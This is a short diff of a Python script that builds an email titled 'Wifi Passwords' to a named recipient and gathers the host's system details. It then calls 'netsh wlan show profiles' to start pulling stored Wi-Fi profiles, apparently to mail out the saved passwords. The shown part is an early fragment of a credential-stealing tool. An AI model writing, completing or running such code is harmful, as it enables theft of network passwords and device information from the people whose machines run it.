@@ -25,11 +25,19 @@ msg["To"] = "Mohammed Mubashir Hasan"
 msg["Subject"] = "Wifi Passwords"
 
 # getting device info
-import os
+import platform
 
-msg.attach(MIMEText(os.getlogin()))
+my_system = platform.uname()
+
+print(f"System: {my_system.system}")
+print(f"Node Name: {my_system.node}")
+print(f"Release: {my_system.release}")
+print(f"Version: {my_system.version}")
+print(f"Machine: {my_system.machine}")
+print(f"Processor: {my_system.processor}")
 
 # now to the wifi extracting stuff
+
 import subprocess
 
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
